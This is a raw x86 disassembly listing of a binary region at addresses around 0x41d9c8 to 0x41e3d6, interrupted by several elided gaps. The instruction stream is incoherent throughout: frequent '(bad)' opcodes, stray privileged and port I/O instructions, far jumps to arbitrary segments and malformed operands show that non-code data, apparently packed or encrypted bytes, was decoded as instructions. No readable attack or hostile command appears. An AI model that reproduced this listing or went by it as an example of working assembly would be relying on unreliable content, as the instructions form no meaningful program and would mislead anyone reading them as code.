  41d9c8:	add    ecx,DWORD PTR cs:[ecx]
  41d9cb:	retf   0xb3b6
  41d9ce:	sar    BYTE PTR [ecx+0x76dc57ac],1
  41d9d4:	cli    
  41d9d5:	cmp    BYTE PTR [esi+ecx*2-0x57d40fcd],ch
  41d9dc:	(bad)  
  41d9dd:	xor    bl,BYTE PTR [esi]
  41d9df:	inc    BYTE PTR [ebp+0x55115503]
  41d9e5:	pop    edi
  41d9e6:	cs int3 
  41d9e8:	enter  0x9b16,0x5
  41d9ec:	xchg   ecx,eax
  41d9ed:	mov    ch,0x4
  41d9ef:	push   ecx
  41d9f0:	xchg   esp,eax
  41d9f1:	mov    bh,0x49
  41d9f3:	add    BYTE PTR [eax],bh
  41d9f5:	repnz sbb DWORD PTR [ecx-0x28],eax
  41d9f9:	sbb    DWORD PTR ds:0x42f0321c,esi
  41d9ff:	stos   DWORD PTR es:[edi],eax
  41da00:	pop    ebp
  41da01:	hlt    
  41da02:	gs jge 0x41d9a0
  41da05:	inc    edi
  41da06:	pop    ds
  41da07:	out    dx,al
  41da08:	iret   
  41da09:	adc    BYTE PTR [edi-0x74c2f6cf],ch
  41da0f:	push   edi
  41da10:	ins    BYTE PTR es:[edi],dx
  41da11:	gs sbb eax,0x7d57fbd7
  41da17:	inc    ebp
  41da18:	push   ebp
  41da19:	push   esp
  41da1a:	inc    eax
  41da1b:	adc    esp,DWORD PTR [edx+0x3f907a11]
  41da21:	(bad)  
  41da22:	sub    BYTE PTR [esi-0x76273547],bh
  41da28:	jmp    0xf07:0x65d99c49
  41da2f:	(bad)  
  41da30:	scas   eax,DWORD PTR es:[edi]
  41da31:	aaa    
  41da32:	jnp    0x41d9fb
  41da34:	mov    ecx,0x0
	...
  41da95:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	cmp    edi,DWORD PTR [esi-0x71]
  41daa5:	mov    eax,ds:0x139c5
  41daaa:	pop    es
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [ebp+0x1],al
  41dab0:	lea    edx,[edi]
  41dab2:	imul   esp,DWORD PTR [eax-0x1d],0xfffffffb
  41dab6:	and    eax,0xd9428a9
  41dabb:	jnp    0x41da43
  41dabd:	add    esp,DWORD PTR [ecx-0x586a839]
  41dac3:	in     eax,0x89
  41dac5:	test   DWORD PTR [esi+ebx*1],esp
  41dac8:	(bad)  
  41dac9:	cmp    al,0x47
  41dacb:	cld    
  41dacc:	inc    ecx
  41dacd:	mov    bh,0x22
  41dacf:	iret   
  41dad0:	xchg   ebx,eax
  41dad1:	hlt    
  41dad2:	lds    ecx,FWORD PTR [esi-0x51]
  41dad5:	fiadd  WORD PTR [ebx+ebx*4+0x5caf5c18]
  41dadc:	lds    ebp,FWORD PTR [esi+ecx*1+0x57]
  41dae0:	mov    BYTE PTR [edi-0x52],dh
  41dae3:	mov    ecx,0x137035fe
  41dae8:	sbb    eax,0x114c041f
  41daed:	cld    
  41daee:	mov    ebp,0xc7d610a5
  41daf3:	loopne 0x41db48
  41daf5:	int    0x42
  41daf7:	hlt    
  41daf8:	scas   al,BYTE PTR es:[edi]
  41daf9:	imul   esp,DWORD PTR [ecx],0xc6ba2f8a
  41daff:	lock ss xchg esp,eax
  41db02:	add    BYTE PTR [ebp-0x60],al
  41db05:	call   0x25184e27
  41db0a:	jmp    0xa741:0xf91a1e0c
  41db11:	ss nop
  41db13:	or     BYTE PTR [edi-0x4004e8],ch
  41db19:	(bad)  
  41db1a:	retf   
  41db1b:	cs scas eax,DWORD PTR es:[edi]
  41db1d:	jecxz  0x41dae5
  41db1f:	xor    DWORD PTR [edx+ebx*4+0xab7cc4c],esp
  41db26:	mov    cl,0x7b
  41db28:	ins    DWORD PTR es:[edi],dx
  41db29:	xlat   BYTE PTR ds:[ebx]
  41db2a:	cdq    
  41db2b:	sbb    ebp,DWORD PTR [edi+0x25a7fc73]
  41db31:	shl    BYTE PTR [ecx],1
  41db33:	inc    ecx
  41db34:	jp     0x41db37
  41db36:	mov    dh,0x2a
  41db38:	sar    BYTE PTR [esi-0x2372a91e],1
  41db3e:	push   edx
  41db3f:	push   esi
  41db40:	adc    eax,DWORD PTR ds:0x6ad717f5
  41db46:	ss push ds
  41db48:	mov    ds:0xb87d2dc0,al
  41db4d:	scas   eax,DWORD PTR es:[edi]
  41db4e:	push   es
  41db4f:	out    0x2d,eax
  41db51:	jo     0x41db8d
  41db53:	mov    esi,0x1162c37c
  41db58:	fild   WORD PTR [eax]
  41db5a:	into   
  41db5b:	and    al,0x74
  41db5d:	mov    cl,ah
  41db5f:	or     eax,0x96c0db9b
  41db64:	inc    ebp
  41db65:	daa    
  41db66:	sar    esi,0x83
  41db69:	mov    edx,0x251a2a50
  41db6e:	jo     0x41db21
  41db70:	pushf  
  41db71:	dec    esi
  41db72:	or     ecx,edx
  41db74:	mov    ah,0xcd
  41db76:	mov    dh,0x56
  41db78:	test   BYTE PTR ds:0x473bdf3a,dh
  41db7e:	mov    ch,dl
  41db80:	loop   0x41db78
  41db82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db83:	mov    esp,0xb6faab11
  41db88:	xor    BYTE PTR [edi+esi*8],ch
  41db8b:	gs stc 
  41db8d:	int    0xb6
  41db8f:	mov    dh,0xb1
  41db91:	std    
  41db92:	cmp    BYTE PTR [edi],bl
  41db94:	mov    bh,0x1
  41db96:	xor    edi,ebx
  41db98:	jo     0x41db50
  41db9a:	stos   DWORD PTR es:[edi],eax
  41db9b:	or     al,0xcb
  41db9d:	call   0x5382:0xd7b38b4f
  41dba4:	call   0xd998795b
  41dba9:	and    eax,0xebb87063
  41dbae:	out    0xa8,eax
  41dbb0:	push   ebp
  41dbb1:	dec    edx
  41dbb2:	push   esp
  41dbb3:	fucomp st(6)
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	push   ebp
  41dc23:	sub    BYTE PTR [eax],al
  41dc25:	inc    esp
  41dc26:	int3   
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    bl,dl
  41dc2f:	xchg   esp,eax
  41dc30:	xlat   BYTE PTR ds:[ebx]
  41dc31:	cli    
  41dc32:	popa   
  41dc33:	mov    cl,dh
  41dc35:	push   es
  41dc36:	xchg   DWORD PTR [edi+0x2b51a6c5],ebx
  41dc3c:	hlt    
  41dc3d:	(bad)  [ecx-0x4f]
  41dc40:	aaa    
  41dc41:	mov    DWORD PTR [esi],ebx
  41dc43:	pop    ecx
  41dc44:	dec    ecx
  41dc45:	out    0x2,al
  41dc47:	and    dl,BYTE PTR [ecx+0x67717f00]
  41dc4d:	xor    DWORD PTR [edx],esp
  41dc4f:	jg     0x41dcae
  41dc51:	shr    DWORD PTR [ecx],0xbd
  41dc54:	inc    eax
  41dc55:	pop    es
  41dc56:	(bad)  
  41dc57:	stos   DWORD PTR es:[edi],eax
  41dc58:	fld    DWORD PTR [ebx]
  41dc5a:	push   ecx
  41dc5b:	(bad)  
  41dc5c:	push   ecx
  41dc5d:	or     DWORD PTR [ecx],0x444ee088
  41dc63:	xchg   DWORD PTR [eax+0x5e2423fa],ebx
  41dc69:	jle    0x41dcd0
  41dc6b:	mov    ah,0xf5
  41dc6d:	pop    es
  41dc6e:	(bad)  
  41dc70:	pop    eax
  41dc71:	adc    al,0xec
  41dc73:	(bad)  
  41dc74:	mov    edx,0x5bccdc66
  41dc79:	pop    ebx
  41dc7a:	cmp    eax,0x67398043
  41dc7f:	fs xor al,0xe3
  41dc82:	xchg   ebp,eax
  41dc83:	pop    eax
  41dc84:	jecxz  0x41dc27
  41dc86:	sbb    al,0xcf
  41dc88:	sub    DWORD PTR [ecx],edi
  41dc8a:	pop    eax
  41dc8b:	add    DWORD PTR [edx+esi*8],edx
  41dc8e:	aad    0x4d
  41dc90:	cmp    BYTE PTR [edi+0x6a],ah
  41dc93:	mov    al,0xad
  41dc95:	xchg   edi,eax
  41dc96:	xchg   edi,ecx
  41dc98:	fdiv   st(3),st
  41dc9a:	loope  0x41dcfd
  41dc9c:	mov    eax,0xc4544541
  41dca1:	xor    ah,BYTE PTR [eax]
  41dca3:	sti    
  41dca4:	cdq    
  41dca5:	add    ah,BYTE PTR ds:0x5bda97be
  41dcab:	mov    esi,0x55da8f8f
  41dcb0:	fiadd  DWORD PTR [edi-0x4a]
  41dcb3:	test   BYTE PTR [edx+0x75],0x20
  41dcb7:	(bad)  
  41dcb8:	jl     0x41dc50
  41dcba:	lods   al,BYTE PTR ds:[esi]
  41dcbb:	ficom  WORD PTR [edx]
  41dcbd:	cld    
  41dcbe:	sub    cl,bh
  41dcc0:	xor    al,BYTE PTR [edi]
  41dcc2:	out    dx,eax
  41dcc3:	mov    ds:0xdf6d23a7,eax
  41dcc8:	jmp    0x41dc72
  41dcca:	fst    DWORD PTR [edi+0x26]
  41dccd:	imul   DWORD PTR [ebx+0x656a87da]
  41dcd3:	and    DWORD PTR [edi+edx*2],0xffffffed
  41dcd7:	inc    edi
  41dcd8:	fdiv   st,st(0)
  41dcda:	shl    DWORD PTR [ebx+0x39fe5109],1
  41dce0:	sub    DWORD PTR [edx-0x577e3e3e],edi
  41dce6:	ret    
  41dce7:	popf   
  41dce8:	xchg   esp,eax
  41dce9:	cli    
  41dcea:	or     BYTE PTR [ecx-0x73c7da5],cl
  41dcf0:	xchg   ecx,eax
  41dcf1:	gs sahf 
  41dcf3:	mov    bl,0x65
  41dcf5:	neg    BYTE PTR [ecx+ebp*4]
  41dcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcf9:	in     eax,0x10
  41dcfb:	sub    dl,ah
  41dcfd:	outs   dx,BYTE PTR fs:[esi]
  41dcff:	fnstsw WORD PTR [ebp+edx*2-0x30197d72]
  41dd06:	retf   0x81bc
  41dd09:	retf   0x9391
  41dd0c:	lods   eax,DWORD PTR ds:[esi]
  41dd0d:	js     0x41dcb1
  41dd0f:	hlt    
  41dd10:	mov    ecx,DWORD PTR [esi]
  41dd12:	jmp    0x41dd2c
  41dd14:	sahf   
  41dd15:	ret    
  41dd16:	pop    eax
  41dd17:	repz pusha 
  41dd19:	inc    eax
  41dd1a:	out    0x71,eax
  41dd1c:	adc    DWORD PTR [edi],esi
  41dd1e:	popa   
  41dd1f:	jmp    0x22c5:0xffed1d68
  41dd26:	faddp  st(4),st
  41dd28:	sub    eax,0x8f91368
  41dd2d:	mov    eax,DWORD PTR [eax+0x2a]
  41dd30:	jae    0x41dcf6
  41dd32:	in     eax,dx
  41dd33:	sbb    ecx,ebx
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x611667bb,eax
  41dda3:	dec    ebx
  41dda4:	lahf   
  41dda5:	inc    edi
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [eax+0x50],ah
  41ddb0:	adc    DWORD PTR [ebx],0xd
  41ddb3:	ror    BYTE PTR [eax],cl
  41ddb5:	xor    edx,DWORD PTR ds:0xaccdb53b
  41ddbb:	pusha  
  41ddbc:	out    dx,al
  41ddbd:	and    DWORD PTR [eax+eiz*8+0x5f855366],ebp
  41ddc4:	and    esi,esp
  41ddc6:	pop    ds
  41ddc7:	out    0x55,al
  41ddc9:	mov    ?,WORD PTR [ecx-0x39]
  41ddcc:	shl    BYTE PTR [eax+0x79],0xbe
  41ddd0:	mov    WORD PTR [esi-0x77619c3a],fs
  41ddd6:	xor    ecx,DWORD PTR [edi+0x7b1b41bb]
  41dddc:	rcl    ch,1
  41ddde:	jp     0x41de11
  41dde0:	gs scas eax,DWORD PTR es:[edi]
  41dde2:	pop    ecx
  41dde3:	loop   0x41de57
  41dde5:	mov    bh,cl
  41dde7:	shr    BYTE PTR [eax+0x34],cl
  41ddea:	out    dx,al
  41ddeb:	arpl   WORD PTR [esi-0x19050445],si
  41ddf1:	pusha  
  41ddf2:	xchg   ebp,eax
  41ddf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddf4:	inc    edi
  41ddf5:	loopne 0x41dda9
  41ddf7:	xchg   edx,eax
  41ddf8:	pop    edx
  41ddf9:	mul    DWORD PTR [edx-0x38]
  41ddfc:	loop   0x41ddf2
  41ddfe:	mov    dl,0xa0
  41de00:	mov    dh,0xc9
  41de02:	cmc    
  41de03:	adc    esi,DWORD PTR [esi]
  41de05:	add    ebx,esp
  41de07:	mov    bh,0x2e
  41de09:	sub    esp,esi
  41de0b:	xor    DWORD PTR [edi],ebx
  41de0d:	and    eax,0x9b114635
  41de12:	mov    al,0xdb
  41de14:	mov    bl,0x65
  41de16:	add    ch,BYTE PTR [esi]
  41de18:	outs   dx,DWORD PTR ds:[esi]
  41de19:	cli    
  41de1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de1b:	in     eax,dx
  41de1c:	outs   dx,DWORD PTR ds:[esi]
  41de1d:	in     al,dx
  41de1e:	add    BYTE PTR [eax],bh
  41de20:	mov    ecx,0xafb67193
  41de25:	fcom   QWORD PTR [esi]
  41de27:	sub    eax,DWORD PTR [ecx]
  41de29:	or     eax,0xeccfe900
  41de2e:	shld   DWORD PTR [esp+ebp*8+0x23ee7968],edi,cl
  41de36:	add    ch,dh
  41de38:	int    0xb
  41de3a:	mov    bh,0xe4
  41de3c:	sbb    bh,BYTE PTR [edx+0x5e0b193e]
  41de42:	inc    ecx
  41de43:	out    dx,al
  41de44:	jecxz  0x41debe
  41de46:	aad    0x54
  41de48:	popa   
  41de49:	jle    0x41de82
  41de4b:	dec    esi
  41de4c:	and    DWORD PTR [ebx+0x3],esp
  41de4f:	cmp    BYTE PTR [eax],0x3b
  41de52:	sub    al,0x2f
  41de54:	adc    edx,DWORD PTR [eax-0x79]
  41de57:	aaa    
  41de58:	dec    ebp
  41de59:	in     eax,0x19
  41de5b:	or     eax,0xf71b2d77
  41de60:	aad    0xf5
  41de62:	add    al,0x62
  41de64:	mov    ds:0xcddeb246,al
  41de69:	inc    eax
  41de6a:	mov    al,ds:0x2057cf1b
  41de6f:	not    BYTE PTR [edx]
  41de71:	mov    ah,0x85
  41de73:	jmp    0x2413:0x19fe39d7
  41de7a:	and    eax,eax
  41de7c:	pop    edx
  41de7d:	repnz xor cl,BYTE PTR [ecx-0x1a4c627d]
  41de84:	lock push edi
  41de86:	cmc    
  41de87:	sub    BYTE PTR [ebx-0x61fbe374],bl
  41de8d:	jg     0x41dee9
  41de8f:	fsub   DWORD PTR [edi+0x32]
  41de92:	add    eax,0x833a0f01
  41de97:	sbb    eax,esi
  41de99:	stc    
  41de9a:	cmc    
  41de9b:	aam    0xa
  41de9d:	rcl    bh,0x33
  41dea0:	cmp    DWORD PTR [ebp+edi*2-0x2f573860],esp
  41dea7:	mov    cl,0x95
  41dea9:	pop    edx
  41deaa:	cmp    eax,0xd0141606
  41deaf:	jae    0x41de8e
  41deb1:	hlt    
  41deb2:	push   esp
  41deb3:	mov    al,ds:0x54
	...
  41df14:	add    BYTE PTR [eax],al
  41df16:	aas    
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0x5d62c191
  41df24:	rol    BYTE PTR [eax+0x13cda],1
  41df2a:	pop    es
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [ebx-0x61],ch
  41df30:	inc    esi
  41df31:	or     eax,0xcc1d6855
  41df36:	sub    al,0x75
  41df38:	rcl    DWORD PTR [esi+0x5371fbea],0x34
  41df3f:	push   edx
  41df40:	jp     0x41df4c
  41df42:	sbb    eax,0xa279d8e3
  41df47:	jmp    0xacb5:0x205a5db5
  41df4e:	inc    ebp
  41df4f:	jb     0x41df8f
  41df51:	ret    0x9ce8
  41df54:	cmp    ebp,esi
  41df56:	pusha  
  41df57:	sub    ecx,DWORD PTR [ebx]
  41df59:	mov    ds:0xe22f0cd,eax
  41df5e:	dec    ecx
  41df5f:	mov    ah,0xff
  41df61:	call   0x66b3ebfc
  41df66:	jmp    0x41df25
  41df68:	jg     0x41dfa1
  41df6a:	ret    
  41df6b:	daa    
  41df6c:	test   DWORD PTR [edi+0x46ad25e8],0x311d4800
  41df76:	and    BYTE PTR [ecx+0x82d6f1a],bh
  41df7c:	sbb    BYTE PTR [eax-0x5e],al
  41df7f:	into   
  41df80:	jno    0x41df90
  41df82:	push   edx
  41df83:	loope  0x41df9f
  41df85:	das    
  41df86:	lahf   
  41df87:	push   ecx
  41df88:	das    
  41df89:	fs push edi
  41df8b:	gs mov bh,0x62
  41df8e:	mov    eax,ds:0x5d2421eb
  41df93:	sbb    dh,BYTE PTR [ecx-0x1a]
  41df96:	xor    ebp,DWORD PTR ds:0x3e880e68
  41df9c:	loopne 0x41e002
  41df9e:	mov    ebx,0x5b38564
  41dfa3:	aam    0x33
  41dfa5:	and    esp,DWORD PTR es:[ecx+0x6831297d]
  41dfac:	sbb    ebx,DWORD PTR [esi+eiz*1+0x355cfb7f]
  41dfb3:	jb     0x41e019
  41dfb5:	int    0x69
  41dfb7:	in     al,0x98
  41dfb9:	in     eax,dx
  41dfba:	cmp    eax,0x945de686
  41dfbf:	pusha  
  41dfc0:	mov    eax,ds:0x9d228120
  41dfc5:	sub    bl,BYTE PTR [ebp+edi*1-0x7b]
  41dfc9:	shl    DWORD PTR [eax+0x2050fd90],0x66
  41dfd0:	ds push ebx
  41dfd2:	xchg   edi,eax
  41dfd3:	mov    edx,gs
  41dfd5:	rcl    cl,1
  41dfd7:	sar    dl,0x3b
  41dfda:	sahf   
  41dfdb:	int3   
  41dfdc:	or     bl,BYTE PTR [eax+esi*8-0x62589348]
  41dfe3:	(bad)  
  41dfe4:	xchg   esi,eax
  41dfe5:	(bad)  
  41dfe8:	xor    eax,0xf4c07c67
  41dfed:	push   es
  41dfee:	dec    edx
  41dfef:	pop    edx
  41dff0:	sbb    eax,0xaf9f7fe6
  41dff5:	sub    al,0xa0
  41dff7:	cdq    
  41dff8:	add    ecx,eax
  41dffa:	(bad)  [ebx-0x1cd9afbe]
  41e000:	and    DWORD PTR [edx+ebx*4-0x6a5b8128],ebx
  41e007:	mov    WORD PTR [edi-0x258e12ef],es
  41e00d:	retf   0xfea4
  41e010:	cmp    eax,DWORD PTR [ebp+0xd5aaa94]
  41e016:	jo     0x41dfe0
  41e018:	add    dh,ah
  41e01a:	mov    ch,0x9f
  41e01c:	mov    DWORD PTR [edx+eiz*4+0x64befa34],eax
  41e023:	sbb    al,0xaa
  41e025:	retf   
  41e026:	(bad)  
  41e028:	popf   
  41e029:	xlat   BYTE PTR ds:[ebx]
  41e02a:	jmp    0x41e064
  41e02c:	loope  0x41e093
  41e02e:	sbb    DWORD PTR [eax-0x55],ebp
  41e031:	fimul  WORD PTR [eax+0x23d8]
	...
  41e093:	add    BYTE PTR [eax],al
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	enter  0x6f45,0x1b
  41e0a6:	loope  0x41e0e5
  41e0a8:	add    DWORD PTR [eax],eax
  41e0aa:	pop    es
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    BYTE PTR [ebp+0x4],bl
  41e0b0:	jo     0x41e08c
  41e0b2:	mov    eax,ds:0xc273552f
  41e0b7:	outs   dx,BYTE PTR ds:[esi]
  41e0b8:	je     0x41e136
  41e0ba:	in     al,0x24
  41e0bc:	xchg   DWORD PTR [esi+0x5c0848fa],ebx
  41e0c2:	mov    cl,0x8c
  41e0c4:	(bad)
  41e0c8:	lods   al,BYTE PTR ds:[esi]
  41e0c9:	gs xchg ecx,eax
  41e0cb:	xor    ch,dl
  41e0cd:	rdtsc  
  41e0cf:	and    ebx,DWORD PTR [ecx-0x67470cc9]
  41e0d5:	cs adc eax,0x6c8dbdf0
  41e0db:	push   DWORD PTR [eax+ebx*8+0x6b]
  41e0df:	icebp  
  41e0e0:	xchg   esi,eax
  41e0e1:	mov    ?,WORD PTR [edi+ebx*1+0x1b341609]
  41e0e8:	push   edx
  41e0e9:	out    0xda,al
  41e0eb:	lock or DWORD PTR [esi-0x7d],edi
  41e0ef:	jmp    0x4661689
  41e0f4:	push   edi
  41e0f5:	dec    ecx
  41e0f6:	mov    dl,0x3
  41e0f8:	xor    DWORD PTR [ebx],ebp
  41e0fa:	not    DWORD PTR [esp+eax*8]
  41e0fd:	add    DWORD PTR [esi-0xb],0x42
  41e101:	dec    edx
  41e102:	mov    edx,0x3e189712
  41e107:	jecxz  0x41e0f5
  41e109:	push   edi
  41e10a:	sub    cl,cl
  41e10c:	aaa    
  41e10d:	fnstsw WORD PTR [esi]
  41e10f:	(bad)  
  41e110:	sub    al,0x16
  41e112:	xchg   edi,eax
  41e113:	mov    esi,DWORD PTR [eax-0x7]
  41e116:	retf   
  41e117:	sub    ecx,ebp
  41e119:	push   eax
  41e11a:	cld    
  41e11b:	(bad)  [eax+0x4bfdd6df]
  41e121:	mov    ebx,0x8044b896
  41e126:	popf   
  41e127:	out    0x5e,eax
  41e129:	sub    bh,BYTE PTR [edx+0x4f8c98bf]
  41e12f:	data16 scas al,BYTE PTR es:[edi]
  41e131:	jo     0x41e0ba
  41e133:	push   esp
  41e134:	xor    esp,DWORD PTR [esi-0x59]
  41e137:	mov    BYTE PTR [edi+0x2],al
  41e13a:	mov    bl,0xad
  41e13c:	div    eax
  41e13e:	scas   eax,DWORD PTR es:[edi]
  41e13f:	xor    eax,DWORD PTR [edx+0x4761499f]
  41e145:	stc    
  41e146:	aam    0x8a
  41e148:	in     eax,dx
  41e149:	mov    cl,0xe
  41e14b:	jne    0x41e1a7
  41e14d:	das    
  41e14e:	test   BYTE PTR [eax],dl
  41e150:	cmc    
  41e151:	lds    edx,FWORD PTR [edx-0x73e664f]
  41e157:	fmul   st,st(2)
  41e159:	mov    al,ds:0xd3c580e1
  41e15e:	out    0x56,al
  41e160:	cmp    al,0x1c
  41e162:	leave  
  41e163:	sub    eax,0xb8ffd8db
  41e168:	cmp    eax,0xc4a83c0
  41e16d:	out    0xf4,eax
  41e16f:	inc    ebx
  41e170:	in     al,0x5f
  41e172:	fcomi  st,st(3)
  41e174:	nop
  41e175:	out    dx,eax
  41e176:	push   ds
  41e177:	es jo  0x41e0fe
  41e17a:	cmp    DWORD PTR ds:0xc8311ff5,0xe55d898d
  41e184:	out    dx,al
  41e185:	xor    dh,dl
  41e187:	popa   
  41e188:	call   0xe6fa6d3d
  41e18d:	shr    dl,cl
  41e18f:	std    
  41e190:	loope  0x41e208
  41e192:	repnz or dl,BYTE PTR [edi+ebx*4]
  41e196:	leave  
  41e197:	dec    esi
  41e198:	mov    bl,0x73
  41e19a:	mov    eax,ds:0x1f157c01
  41e19f:	into   
  41e1a0:	cwde   
  41e1a1:	(bad)  
  41e1a2:	pushf  
  41e1a3:	adc    edx,DWORD PTR [edi+0x1d]
  41e1a6:	(bad)  
  41e1a7:	fsubp  st(1),st
  41e1a9:	daa    
  41e1aa:	or     edx,edi
  41e1ac:	inc    edi
  41e1ad:	inc    esi
  41e1ae:	adc    al,0x21
  41e1b0:	pop    eax
  41e1b1:	cs pop edi
  41e1b3:	test   eax,0x5a
	...
  41e214:	add    BYTE PTR [eax],al
  41e216:	stos   DWORD PTR es:[edi],eax
  41e217:	add    dh,BYTE PTR [edi-0x1a]
  41e21a:	push   edi
  41e21c:	mov    ebx,0xf08a4a4f
  41e221:	mov    edx,DWORD PTR [ebp+ebp*2-0x14]
  41e225:	jae    0x41e20f
  41e227:	add    DWORD PTR ds:[eax],eax
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edx],al
  41e22f:	cmp    edx,edx
  41e231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e232:	xchg   edi,eax
  41e233:	ret    
  41e234:	mov    eax,ds:0x2d9d0dd8
  41e239:	inc    ebx
  41e23a:	jmp    0x1fad:0x4585c192
  41e241:	ds xchg esp,eax
  41e243:	enter  0x61d9,0x5a
  41e247:	jo     0x41e279
  41e249:	jne    0x41e23e
  41e24b:	ficomp DWORD PTR [edx]
  41e24d:	(bad)  
  41e24e:	push   esp
  41e24f:	leave  
  41e250:	je     0x41e235
  41e252:	fs (bad) 
  41e254:	pop    ebp
  41e255:	xchg   BYTE PTR [eax+edi*4],ch
  41e258:	jns    0x41e288
  41e25a:	dec    ecx
  41e25b:	xor    ecx,DWORD PTR [edx+0x165ba321]
  41e261:	push   ds
  41e262:	jae    0x41e23c
  41e264:	out    0xce,eax
  41e266:	outs   dx,BYTE PTR ds:[esi]
  41e267:	jnp    0x41e2a0
  41e269:	push   0xe6c22ab8
  41e26e:	sbb    eax,DWORD PTR [edi-0x6a]
  41e271:	push   0x90274bb
  41e276:	push   0x2d469f3c
  41e27b:	dec    esi
  41e27c:	jg     0x41e2b8
  41e27e:	add    DWORD PTR [edx-0x55],edx
  41e281:	xchg   ebp,eax
  41e282:	jl     0x41e23c
  41e284:	inc    ecx
  41e285:	push   0x35
  41e287:	imul   esp,DWORD PTR [esi+ebp*4-0x53],0xe
  41e28c:	push   ebp
  41e28d:	mov    ah,0x49
  41e28f:	jmp    0x26d7:0x580637ed
  41e296:	in     eax,dx
  41e297:	mov    DWORD PTR [edi+ecx*8-0x58c9b1e2],ebp
  41e29e:	je     0x41e284
  41e2a0:	dec    edi
  41e2a1:	loopne 0x41e2aa
  41e2a3:	jno    0x41e264
  41e2a5:	xor    ah,BYTE PTR [ecx+eiz*4]
  41e2a8:	sub    BYTE PTR [edi-0x4c],cl
  41e2ab:	mov    ch,0xcd
  41e2ad:	sbb    eax,0xa4401cab
  41e2b2:	xchg   esp,eax
  41e2b3:	outs   dx,BYTE PTR ds:[esi]
  41e2b4:	pop    ecx
  41e2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2b6:	and    esi,DWORD PTR [edx]
  41e2b8:	pop    ebp
  41e2b9:	mov    ebp,0xcffb9544
  41e2be:	std    
  41e2bf:	scas   eax,DWORD PTR es:[edi]
  41e2c0:	mov    DWORD PTR [edi],esp
  41e2c2:	add    eax,0x74bf08b1
  41e2c7:	nop
  41e2c8:	sub    ebx,DWORD PTR [ebx+0x54]
  41e2cb:	add    bl,BYTE PTR [ecx+0x32bccad5]
  41e2d1:	ins    BYTE PTR es:[edi],dx
  41e2d2:	ds pushf 
  41e2d4:	cld    
  41e2d5:	mov    eax,ds:0xd0a750f0
  41e2da:	int    0x7d
  41e2dc:	hlt    
  41e2dd:	test   DWORD PTR [esi+0x64],0x57c78961
  41e2e4:	mov    esp,0xa40c4ee1
  41e2e9:	sub    eax,0x1ffab6b
  41e2ee:	cmp    eax,edi
  41e2f0:	fs loope 0x41e329
  41e2f3:	fmul   st,st(4)
  41e2f5:	push   eax
  41e2f6:	enter  0x541,0xa3
  41e2fa:	cld    
  41e2fb:	inc    ebx
  41e2fc:	mov    eax,ds:0xbfcefec
  41e301:	ins    BYTE PTR es:[edi],dx
  41e302:	icebp  
  41e303:	push   ebp
  41e304:	bt     DWORD PTR ds:0x6630218,ebp
  41e30b:	lahf   
  41e30c:	sbb    ah,BYTE PTR [ecx+eiz*1+0x262ba474]
  41e313:	cmp    esi,ecx
  41e315:	addr16 or eax,0x8c2c488e
  41e31b:	loope  0x41e303
  41e31d:	xor    al,0x58
  41e31f:	std    
  41e320:	aas    
  41e321:	sub    BYTE PTR [ebx+eiz*8-0x3f],ah
  41e325:	sti    
  41e326:	push   edx
  41e327:	xchg   esi,eax
  41e328:	and    BYTE PTR [edx+0x1136a363],bh
  41e32e:	(bad)  
  41e32f:	aam    0x50
  41e331:	scas   al,BYTE PTR es:[edi]
  41e332:	xchg   edx,eax
  41e333:	scas   eax,DWORD PTR es:[edi]
  41e334:	test   BYTE PTR [eax],al
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xc0204855
  41e3a3:	or     bl,BYTE PTR [edx+0x13fefef]
  41e3a9:	add    BYTE PTR [edi],al
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [eax],al
  41e3af:	mov    cl,0x69
  41e3b1:	mov    DWORD PTR [ecx],eax
  41e3b3:	dec    eax
  41e3b4:	sub    DWORD PTR [ecx],0xa56753e7
  41e3ba:	(bad)  
  41e3bb:	cmp    ebx,DWORD PTR [edx+0x21]
  41e3be:	sub    DWORD PTR [edx+0x24],esp
  41e3c1:	inc    edi
  41e3c2:	fcomp  QWORD PTR [ebx-0x4a43e1d]
  41e3c8:	shr    BYTE PTR [esi+0x5f],0x8c
  41e3cc:	scas   al,BYTE PTR es:[edi]
  41e3cd:	daa    
  41e3ce:	adc    BYTE PTR [edi+ecx*1+0x7c],bl
  41e3d2:	pop    edi
  41e3d3:	sbb    BYTE PTR [esi],0x80
  41e3d6:	dec    esi
